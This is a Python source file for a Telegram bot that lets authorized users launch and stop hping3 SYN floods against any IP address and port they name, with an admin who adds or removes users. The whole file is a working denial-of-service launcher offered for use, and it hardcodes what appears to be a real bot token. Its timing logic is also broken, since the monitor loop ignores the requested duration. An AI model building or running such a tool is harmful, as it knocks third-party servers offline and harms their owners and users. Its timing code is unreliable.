import os
import subprocess
import threading
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Bot token and admin ID
TOKEN = "7908068015:AAFucAomrbNoMAU2XZy1HgeMwuf9D0VtKZo"  # Replace with your token
ADMIN_ID = 7263893682  # Replace with your admin ID

# Configure logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Globals
authorized_users = set()  # Stores authorized user IDs
authorized_users.add(ADMIN_ID)  # Add the admin as an authorized user
attack_process = None
attack_thread = None


# Helper Functions
def is_authorized(user_id):
    return user_id in authorized_users


def start_attack(ip, port, duration):
    global attack_process, attack_thread
    if attack_process is None or attack_process.poll() is not None:
        attack_process = subprocess.Popen(
            ["hping3", "-S", "-p", str(port), "-c", str(int(duration * 1000)), "-d", "120", "-w", "64", ip]
        )
        attack_thread = threading.Thread(target=monitor_attack, args=(attack_process, duration))
        attack_thread.start()
        return True
    return False


def monitor_attack(process, duration):
    start_time = threading.current_thread()
    while process.poll() is None and threading.current_thread() is start_time:
        pass
    if process.poll() is None:
        process.terminate()


def stop_attack():
    global attack_process, attack_thread
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        attack_process = None
        if attack_thread and attack_thread.is_alive():
            attack_thread.join()
        return True
    return False


# Command Handlers
async def start_command(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        "Welcome to the bot! Use /help to see available commands."
    )


async def help_command(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        "Available Commands:\n"
        "/attack <ip> <port> <time> - Start an attack.\n"
        "/stop - Stop the ongoing attack.\n"
        "/adduser <id> - Add an authorized user.\n"
        "/removeuser <id> - Remove an authorized user.\n"
        "/help - Show this help message.\n"
        "/start - Show welcome message."
    )


async def attack_command(update: Update, context: CallbackContext) -> None:
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time_in_minutes>")
        return

    ip, port, duration = args
    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        await update.message.reply_text("Port and duration must be integers.")
        return

    if start_attack(ip, port, duration):
        await update.message.reply_text(f"Attack started on {ip}:{port} for {duration} minutes.")
    else:
        await update.message.reply_text("An attack is already running.")


async def stop_command(update: Update, context: CallbackContext) -> None:
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("You are not authorized to use this command.")
        return

    if stop_attack():
        await update.message.reply_text("Attack stopped.")
    else:
        await update.message.reply_text("No attack is currently running.")


async def add_user_command(update: Update, context: CallbackContext) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /adduser <id>")
        return

    try:
        user_id = int(args[0])
        authorized_users.add(user_id)
        await update.message.reply_text(f"User {user_id} added successfully.")
    except ValueError:
        await update.message.reply_text("Invalid user ID.")


async def remove_user_command(update: Update, context: CallbackContext) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /removeuser <id>")
        return

    try:
        user_id = int(args[0])
        authorized_users.discard(user_id)
        await update.message.reply_text(f"User {user_id} removed successfully.")
    except ValueError:
        await update.message.reply_text("Invalid user ID.")


async def error_handler(update: Update, context: CallbackContext) -> None:
    logger.error(f"Update {update} caused error {context.error}")
    if update.message:
        await update.message.reply_text("An error occurred. Please try again later.")


# Main Function
def main():
    application = Application.builder().token(TOKEN).build()

    # Register Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("adduser", add_user_command))
    application.add_handler(CommandHandler("removeuser", remove_user_command))
    application.add_error_handler(error_handler)

    # Start the bot
    application.run_polling()


if __name__ == "__main__":
    main()